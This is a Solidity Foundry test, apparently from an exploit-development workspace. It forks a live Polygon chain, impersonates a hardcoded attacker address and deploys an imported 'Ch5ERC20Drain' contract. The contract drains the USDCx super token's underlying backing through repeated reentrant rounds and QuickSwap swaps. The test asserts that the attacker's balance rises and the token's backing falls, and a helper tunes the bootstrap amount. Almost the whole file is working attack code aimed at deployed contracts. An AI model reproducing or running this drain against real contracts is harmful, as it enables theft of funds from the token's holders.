// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {
    Ch5ERC20Drain,
    ISuperToken,
    IERC20Minimal,
    IQuickSwapRouter
} from "../exploit/Run.s.sol";

/// @notice Single-token current-head validation for the generalized ERC20
///         continuation helper. This mirrors the USDCx branch of `Run.run()`
///         after the native MATICx stage has already been exhausted.
contract Attempt54CurrentHeadUSDCContinuationTest is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address internal constant ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;
    address internal constant WMATIC = 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;
    address internal constant USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;

    uint256 internal constant MAX_REENTRY_COUNT = 50;
    uint256 internal constant MAX_ROUNDS_PER_HELPER = 1;
    uint256 internal constant GAS_RESERVE = 5 ether;
    uint256 internal constant USDC_BOOTSTRAP_FLOOR = 250 ether;
    uint32 internal constant USDC_INDEX_BASE = 520_000_000;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_current_head_usdc_continuation_is_profitable() public {
        address underlying = ISuperToken(USDCX).getUnderlyingToken();
        uint256 nativeBefore = ATTACKER.balance;
        uint256 backingBefore = IERC20Minimal(underlying).balanceOf(USDCX);
        require(backingBefore > 1, "USDCx backing already empty");

        uint256 spendableNative = nativeBefore > GAS_RESERVE ? nativeBefore - GAS_RESERVE : 0;
        require(spendableNative > 0, "no spendable native");

        uint256 targetUnderlying = backingBefore / (MAX_REENTRY_COUNT + 2);
        uint256 bootstrapNative = _bootstrapForTargetUnderlying(underlying, targetUnderlying, spendableNative);
        if (bootstrapNative < USDC_BOOTSTRAP_FLOOR) {
            bootstrapNative = USDC_BOOTSTRAP_FLOOR;
        }
        if (bootstrapNative > spendableNative) {
            bootstrapNative = spendableNative;
        }

        vm.startPrank(ATTACKER);
        Ch5ERC20Drain drain = new Ch5ERC20Drain(USDCX, ROUTER, USDC_INDEX_BASE, address(0));
        (uint256 roundsExecuted, uint256 nativeOut) =
            drain.executeDrain{value: bootstrapNative}(MAX_ROUNDS_PER_HELPER, MAX_REENTRY_COUNT);
        vm.stopPrank();

        uint256 nativeAfter = ATTACKER.balance;
        uint256 backingAfter = IERC20Minimal(underlying).balanceOf(USDCX);

        console.log("attacker native before:", nativeBefore);
        console.log("attacker native after:", nativeAfter);
        console.log("attacker native delta:", nativeAfter - nativeBefore);
        console.log("USDCx backing before:", backingBefore);
        console.log("USDCx backing after:", backingAfter);
        console.log("bootstrap native:", bootstrapNative);
        console.log("rounds executed:", roundsExecuted);
        console.log("native out:", nativeOut);

        assertGt(roundsExecuted, 0, "no rounds executed");
        assertGt(nativeAfter, nativeBefore, "continuation not profitable");
        assertLt(backingAfter, backingBefore, "USDCx backing unchanged");
    }

    function _bootstrapForTargetUnderlying(address underlying, uint256 targetUnderlying, uint256 maxNative)
        internal
        view
        returns (uint256 bootstrapNative)
    {
        if (targetUnderlying == 0 || maxNative == 0) {
            return 0;
        }

        address[] memory path = new address[](2);
        path[0] = WMATIC;
        path[1] = underlying;

        uint256 quotedMax = IQuickSwapRouter(ROUTER).getAmountsOut(maxNative, path)[1];
        if (quotedMax <= targetUnderlying) {
            return maxNative;
        }

        uint256 low = 1;
        uint256 high = maxNative;
        while (low < high) {
            uint256 mid = low + ((high - low) >> 1);
            uint256 quoted = IQuickSwapRouter(ROUTER).getAmountsOut(mid, path)[1];
            if (quoted >= targetUnderlying) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }

        bootstrapNative = low + (low / 20) + 0.1 ether;
    }
}
